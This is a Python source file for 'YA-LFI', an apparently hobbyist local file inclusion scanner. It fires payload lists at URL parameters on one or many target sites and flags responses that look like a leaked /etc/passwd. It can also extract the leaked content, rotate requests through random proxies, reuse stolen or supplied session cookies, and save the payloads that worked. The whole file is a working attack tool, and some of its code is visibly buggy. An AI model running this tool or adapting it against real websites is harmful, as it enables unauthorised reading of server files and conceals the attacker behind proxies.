from bs4 import BeautifulSoup
import requests
import argparse
import threading
import mmap
import os
import time
from urllib3.exceptions import NameResolutionError
from requests.exceptions import RequestException
import random
from threading import Lock
import json
import urllib.parse
import copy
from urllib.parse import urlparse


if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")


print("""

▄██   ▄      ▄████████           ▄█          ▄████████  ▄█  
███   ██▄   ███    ███          ███         ███    ███ ███  
███▄▄▄███   ███    ███          ███         ███    █▀  ███▌ 
▀▀▀▀▀▀███   ███    ███  ██████  ███        ▄███▄▄▄     ███▌ 
▄██   ███ ▀███████████  ██████  ███       ▀▀███▀▀▀     ███▌ 
███   ███   ███    ███          ███         ███        ███  
███   ███   ███    ███          ███▌    ▄   ███        ███  
 ▀█████▀    ███    █▀           █████▄▄██   ███        █▀   
                                   

Made by: Apollyon 
Based on: LFIScanner by R3LI4NT         
Do python LFIscanner.py -h for help              
""")
parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',help="Target URL",required=False)
parse.add_argument('-ulist','--url_list',help="Target multiple URLs from a file",required=False)
parse.add_argument('-ta','--test_all',help="Test all given parameters for LFI [Only last one is tested by default]", action = "store_true",required=False)
parse.add_argument('-to','--timeout',help="Set timeout for requests [10 seconds by default]", default=10,required=False)
parse.add_argument('-wiz','--wizard',help="Run the wizard, for beginner and first time users",required=False,default=False, action = "store_true")
parse.add_argument('-e','--extract',help="Extract content", action='store_true',required=False)
parse.add_argument('-p','--payload',help="Payloads file [Pre installed lists: all_os.txt , linux.txt , windows.txt]",required=False)
parse.add_argument('-t','--threads',help="Threads [5 by default]",default=5,required=False)
parse.add_argument('-pr','--proxy',help="Add a list of proxies to use [HTTP, HTTPS, SOCKS]",required=False)
parse.add_argument('-auth','--authentication',help="Load headers and/or cookies and/or URL schema from a file to run a scan while authenticated",required=False,default="auth.json")
parse.add_argument('-save','--save_to_file',help="Save working LFI payloads by writing them to a file",required=False,default="LFI_scanner_saves.txt")
parse = parse.parse_args()

lock = Lock()

to_test_all = False
if parse.test_all:
	to_test_all = True

try:
	req_timeout = int(parse.timeout)
except:
	print("[X] REQUEST TIMEOUT VALUE MUST BE INTEGER")
	

def parse_url(url):

	if r"https://" in url or r"http://" in url:
		pass
	else:
		url = r"https://" + url #we consider it to be https by default

	params = urllib.parse.urlparse(url).query

	domain = urlparse(url).netloc
	protocol = urlparse(url).scheme
	path = urlparse(url).path

	return (url , params , domain , protocol ,path)

def payload_counter(payload_file_path):
	with open(payload_file_path, 'rb+') as f:
		mm = mmap.mmap(f.fileno(), 0)
		lines = 0
		while mm.readline():
			lines += 1
		mm.close()
		return lines

def load_internal_payloads(payload_path):
	if os.path.isfile(payload_path):
		payloads = open(payload_path,'r')
		return payloads
	else:
		print("[X] SPECIFIED PAYLOADS NOT FOUND. PLEASE REINSTALL TOOL OR PAYLOAD FILE")
		quit()

def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract,req_timeout):

	global proxies_but_dict
	global proxy_running
	payloads = load_internal_payloads(payload_path)
	
	payload_count = 0
	pointer_line = 0
	print(f"Thread number {x+1} launched on URL {target_url} Checking payloads ...")
	last_msg_was_error = False
	for p in payloads:
		try:
			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread): 
				p = p.strip()
				
				if proxy_running:
					query = requests.get(target_url+p , headers=headers , proxies=random.choice(proxies_but_dict), cookies=cookies, timeout=req_timeout)
				else:
					query = requests.get(target_url+p , headers=headers, cookies=cookies, timeout=req_timeout)

				payload_count = payload_count + 1
				if payload_count%25 == 0:
					print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Checked {payload_count} payloads...")
				if "root" in query.text and "bash" in query.text and r"/bin" in query.text and query.status_code//100 == 2:
					print("="*10)
					print(f"LFI DETECTED:\n URL + Payload: {target_url+p}\n\n")
					if to_extract:
						e = BeautifulSoup(query.text,'html5lib')
						print(e.blockquote.text)
					if save_file_path:
						if os.path.isfile(save_file_path):
							lock.acquire()
							with open(save_file_path , "a") as save_file:
								save_file.write(target_url+p)
								save_file.write("\n")
							lock.release()
						else:
							lock.acquire()
							with open(save_file_path , "w") as save_file:
								save_file.write(target_url+p)
								save_file.write("\n")
							lock.release()
						print(f"LFI DETECTED: Saved to save file \n")
					print("="*10)
			pointer_line = pointer_line + 1
			last_msg_was_error = False
		except RequestException:
			if not last_msg_was_error:
				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occured while making request")
				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
				last_msg_was_error = True
				time.sleep(3)
			else:
				time.sleep(3)
		except NameResolutionError:
			if not last_msg_was_error:
				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Error occured while resolving domain name. Are you sure the specified website exists and you are connected to the internet ?")
				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
				last_msg_was_error = True
				time.sleep(3)
			else:
				time.sleep(3)

def url_parameterizing(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins,to_test_all,req_timeout):

	#here were parse the target url tuple to allow scanning for each and every param and proper auth stuff
	#structure of the tuple target url is ('full url', 'params', 'domain+tld', 'protocol' , 'path')

	def add_url_password_username(domain , protocol , username , password):
		#note to self and future devs, this function leads to loss of params which should be added later
		something_raw = r"://"
		url = f"{protocol}{something_raw}{username}:{password}@{domain}"
		return url

	actual_target_url = target_url[2]
	if url_schema_logins:
		if not special_url_schema_logins:
			actual_target_url = add_url_password_username(target_url[2] , target_url[3] , url_schema_logins[0] , url_schema_logins[1])
		else:
			if target_url[0] not in special_url_schema_logins:
				actual_target_url = add_url_password_username(target_url[2] , target_url[3] , url_schema_logins[0] , url_schema_logins[1])
			else:
				actual_target_url = add_url_password_username(target_url[2] , target_url[3] , special_url_schema_logins[target_url[0]][0] , special_url_schema_logins[target_url[0]][0])
				
	if special_url_schema_logins:
		if target_url[0] not in special_url_schema_logins:
				actual_target_url = add_url_password_username(target_url[2] , target_url[3] , url_schema_logins[0] , url_schema_logins[1])
		else:
			actual_target_url = add_url_password_username(target_url[2] , target_url[3] , special_url_schema_logins[target_url[0]][0] , special_url_schema_logins[target_url[0]][0])

	if special_cookies:
		if target_url[2] in special_cookies:
			cookies = special_cookies[target_url[2]]

	if special_headers:
		if target_url[2] in special_headers:
			headers = special_headers[target_url[2]]

	def param_parsers(params):
		#this would return a dict of params along with their values the user entered
		#for example ?a=123&b=456&c= becomes {"a" : 123 , "b": 456 , "c": ""}
		#use this custom parser instead of urllibs inbuilt because the inbuilt ignores empty params ie the c param in the example given above

		params_json = {}
		params_list = params.split("&")
		for param_split in params_list:
			param_split_list = param_split.split("=")
			param_name , param_value = param_split_list[0] , param_split_list[1]
			params_json[param_name] = param_value

		return params_json

	params_json = param_parsers(target_url[1])
	if not params_json:
		print(f"[X] Thread {x+1} | Running on URL: {target_url[0]} | Status: The URL doesnt have any parameter available for testing.")
		quit()
				
	# url reconstruction for the requests now
	if to_test_all:
		for j in range(len(params_json)): #we inject the Jth parameter every time
						
			select_param = ""
			actual_target_url_2 = f"{actual_target_url}{target_url[4]}?"
			for param_count , param in enumerate(params_json):
				if param_count != j:
					actual_target_url_2 = f"{actual_target_url_2}{param}={params_json[param]}&"
				else:
					select_param = param

			something_raw = r"://"	
			actual_target_url_2 = f"{target_url[3]}{something_raw}{actual_target_url_2}{select_param}="
			
			print("a")
			check_single_url_with_payload(x,payloads_per_thread,payload_path,actual_target_url_2,cookies,headers,save_file_path,to_extract,req_timeout)
	else:
		check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url[0],cookies,headers,save_file_path,to_extract,req_timeout)

def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins,to_test_all,req_timeout):
	if not target_url:
		if os.path.isfile(url_list_path):
			with open(url_list_path) as targets_file:
				for target in targets_file:
					target = target.strip()
					if target:
						target = parse_url(target)
						url_parameterizing(x,payloads_per_thread,payload_path,target,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins,to_test_all,req_timeout)
		else:
			print("[X] NO TARGET URL SPECIFIED")
			quit()
	else:
		url_parameterizing(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins,to_test_all,req_timeout)


def count_payloads(payload_input):
	match payload_input:
		case "all_os" | "all_os.txt" | "allos" | "allos.txt" | "1":
			print("[*] USING PAYLOADS FOR ALL OS SERVERS")
			payload_path = "all_os.txt"
			payload_count = payload_counter(payload_path)
		case "linux" | "linux.txt" | "2":
			print("[*] USING PAYLOADS FOR LINUX SERVERS")
			payload_path = "linux.txt"
			payload_count = payload_counter(payload_path)
		case "windows" | "windows.txt" | "3":
			print("[*] USING PAYLOADS FOR WINDOWS SERVERS")
			payload_path = "windows.txt"
			payload_count = payload_counter(payload_path)
		case _:
			if os.path.isfile(selected_payload_file):
				payload_path = selected_payload_file
			else:
				print("[X] SPECIFIED PAYLOAD FILE NOT FOUND")
				quit()

	return payload_count , payload_path



global proxies_but_dict
global proxy_running
proxy_running = False

def load_proxies(proxy_path):
	global proxies_but_dict
	global proxy_running

	proxy_running = True
	if os.path.isfile(proxy_path):
		with open(proxy_path , "r") as proxy_file:
			proxies = proxy_file.readlines()
		proxies = list(filter(None, proxies)) #remove emptiness
		proxies_but_dict = []
		for proxy in proxies:
			proxy = proxy.strip()
			if proxy:
				try:
					proxy_split = proxy.split(r"://")
					proxy_ip , proxy_scheme = proxy_split[1] , proxy_split[0]
					proxy_dict = {
						proxy_scheme:proxy
					}
					proxies_but_dict.append(proxy_dict)
				except:
					print(f"[!] ERROR WHILE LOADING PROXY {proxy}, USING REST OF THE PROXIES")
		if len(proxies_but_dict) == 0:
			print(f"[!] NO VALID PROXIES, RUNNING WITHOUT PROXIES")
			proxy_running = False
		else:
			print(f"[*] RUNNING USING PROXIES GIVEN")
	else:
		print("[X] PROXY FILE PATH DOES NOT EXIST")
		quit()


if parse.proxy:
	load_proxies(parse.proxy.lower())

headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
		"Accept-Language": "en-US,en;q=0.6",
		"Accept-Encoding": "gzip, deflate, br, zstd"
    }
cookies = {}
#default headers

def load_authentication(auth_path , headers , cookies):

	special_cookies = {}
	special_headers = {}
	special_url_schema_logins = {}

	if os.path.isfile(auth_path):
		with open(auth_path , "r") as auth_file:
			auth_data = auth_file.read()
		auth_data = json.loads(auth_data)
		#loading headers
		if auth_data["auth_headers"]:
			for header in auth_data["auth_headers"]:
				headers[header] = auth_data["auth_headers"][header]

		if auth_data["cookies"]:
			cookies = auth_data["cookies"]

		url_schema_logins = False
		if auth_data["url_schema_login"]:
			url_schema_logins = (auth_data["url_schema_login"][0] , auth_data["url_schema_login"][1],)

		
		if auth_data["special_cookies"]:
			special_cookies = auth_data["special_cookies"]

		if auth_data["special_auth_headers"]:
			special_headers = auth_data["special_auth_headers"]
			for domain in auth_data["special_auth_headers"]:
				for header in headers:
					if header not in auth_data["special_auth_headers"][domain]:
						auth_data["special_auth_headers"][domain][header] = headers[header]

		if auth_data["special_url_schema_login"]:
			special_url_schema_logins = auth_data["special_url_schema_login"]
		
	else:
		print("[X] AUTH FILE DOES NOT EXIST")
	
	return headers,cookies,url_schema_logins,special_cookies,special_headers,special_url_schema_logins

if parse.authentication:
	headers,cookies,url_schema_logins,special_cookies,special_headers,special_url_schema_logins = load_authentication(parse.authentication , headers , cookies)



if not parse.wizard:
	if parse.payload:
		payload_count , payload_path = count_payloads(parse.payload.lower())
	else:
		print("[X] NO PAYLOAD FILE SPECIFIED")
		quit()

	if parse.extract:
		to_extract = True
	else:
		to_extract = False

	if parse.save_to_file:
		save_file_path = parse.save_to_file
	else:
		save_file_path = False

	if parse.url:
		print(f"[*] RUNNING ON TARGET ---> {parse.url}")
		current_target = parse_url(parse.url)
		payloads_per_thread = payload_count//int(parse.threads)

		for x in range(int(parse.threads)):
			threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins , to_test_all,req_timeout)).start()	
	else:
		print(f"[*] RUNNING ON MULTIPLE TARGETS")
		url_list_path = parse.url_list.lower()
		if url_list_path:
			if os.path.isfile(url_list_path):
				payloads_per_thread = payload_count//int(parse.threads)

				for x in range(int(parse.threads)):
					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins , to_test_all,req_timeout)).start()	
			else:
				print("[X] GIVEN TARGET URL FILE NOT FOUND")	
		else:
			print("[X] NO TARGET URL SPECIFIED")
			quit()
else:
	target_mode = input("YA-LFI Wizard | Do you want to check a [1]single URL or a [2]multiple URLs :").strip().lower()
	match target_mode:
		case "2" | "multiple":
			url_list_path = input("YA-LFI Wizard | Enter the file path from where you want to get the URLs to scan :").strip()
			if os.path.isfile(url_list_path):
				threads_count = input("YA-LFI Wizard | How many threads do you want to use :").strip()
				try:
					if threads_count:
						threads_count = int(threads_count)
					else:
						threads_count = 5
				except:
					threads_count = 5

				test_all = input("YA-LFI Wizard | Do you want to test all parameters (This will take considerably more time) ? (y)es/(n)o :").strip().lower()

				match test_all:
					case "1" | "y" | "yes" | "(y)es":
						to_test_all  = True
					case "2" | "n" | "no" | "(n)o":
						to_test_all  = False
					case _:
						to_test_all  = False

				payload_file = input("YA-LFI Wizard | Enter the path to payload list you want to use [Builtins: [1]all_os.txt , [2]linux.txt , [3]windows.txt] :").strip().lower()

				payload_count , payload_path = count_payloads(payload_file)
				payloads_per_thread = payload_count//threads_count



				req_timeout = input("YA-LFI Wizard | Enter the timeout value for each request in seconds :").strip().lower()
				try:
					req_timeout = int(req_timeout)
				except:
					print("[X] REQUEST TIMEOUT VALUE MUST BE INTEGER")

				proxy_file = input("YA-LFI Wizard | Enter the path for the proxy file if you want to use them, leave blank or enter no if you dont want to use proxies :").strip().lower()
				if proxy_file:
					load_proxies(proxy_file)
				
				auth_file = input("YA-LFI Wizard | Enter the path for auth headers and cookies if you want to use them, leave blank or enter no if you dont want to scan without auth :").strip().lower()

				if auth_file:
					headers,cookies,url_schema_logins,special_cookies,special_headers,special_url_schema_logins = load_authentication(parse.authentication , headers , cookies)

				save_file_path = input("YA-LFI Wizard | Enter the path for file where to save results, leave blank or enter no if you dont want to scan without auth :").strip().lower()

				to_extract = input("YA-LFI Wizard | Do you want to extract the content if a working payload is found 1:(y)es / 2:(n)o :").strip().lower()

				match to_extract:
					case "1" | "y" | "yes" | "(y)es":
						to_extract = True
					case "2" | "n" | "no" | "(n)o":
						to_extract = False
					case _:
						to_extract = False

				for x in range(threads_count):
					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins , to_test_all,req_timeout)).start()		
			else:
				print("[X] GIVEN TARGET URL FILE NOT FOUND")	

		case "1" | "single":
			current_target= input("YA-LFI Wizard | Enter the URL to scan :").strip()

			print(f"[*] RUNNING ON TARGET ---> {current_target}")
			current_target = parse_url(current_target)

			threads_count = input("YA-LFI Wizard | How many threads do you want to use :").strip()
			try:
				if threads_count:
					threads_count = int(threads_count)
				else:
					threads_count = 5
			except:
				threads_count = 5

			test_all = input("YA-LFI Wizard | Do you want to test all parameters (This will take considerably more time) ? (y)es/(n)o :").strip().lower()
				
			match test_all:
				case "1" | "y" | "yes" | "(y)es":
					to_test_all  = True
				case "2" | "n" | "no" | "(n)o":
					to_test_all  = False
				case _:
					to_test_all  = False

			payload_file = input("YA-LFI Wizard | Enter the path to payload list you want to use [Builtins: [1]all_os.txt , [2]linux.txt , [3]windows.txt]:").strip().lower()

			payload_count , payload_path = count_payloads(payload_file)
			payloads_per_thread = payload_count//threads_count

			req_timeout = input("YA-LFI Wizard | Enter the timeout value for each request in seconds [10 seconds by default]:").strip().lower()
			try:
				req_timeout = int(req_timeout)
			except:
				print("[X] REQUEST TIMEOUT VALUE MUST BE INTEGER")

			proxy_file = input("YA-LFI Wizard | Enter the path for the proxy file if you want to use them, leave blank or enter no if you dont want to use proxies").strip().lower()
			if proxy_file:
				load_proxies(proxy_file)
				
			auth_file = input("YA-LFI Wizard | Enter the path for auth headers and cookies if you want to use them, leave blank or enter no if you dont want to scan without auth :").strip().lower()

			if auth_file:
				headers,cookies,url_schema_logins,special_cookies,special_headers,special_url_schema_logins = load_authentication(parse.authentication , headers , cookies)

			save_file_path = input("YA-LFI Wizard | Enter the path for file where to save results, leave blank or enter no if you dont want to scan without auth :").strip().lower()

			to_extract = input("YA-LFI Wizard | Do you want to extract the content if a working payload is found 1:(y)es / 2:(n)o :").strip().lower()
			
			match to_extract:
				case "1" | "y" | "yes" | "(y)es":
					to_extract = True
				case "2" | "n" | "no" | "(n)o":
					to_extract = False
				case _:
					to_extract = False


			payloads_per_thread = payload_count//threads_count

			for x in range(threads_count):
				threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract,url_schema_logins,special_cookies,special_headers,special_url_schema_logins , to_test_all,req_timeout)).start()	

		case _:	
			print("[X] NOT A VALID OPTION PLEASE RE LAUNCH THE PROGRAM AND SELECT AN AVAILABLE OPTION")
			quit()
			

	
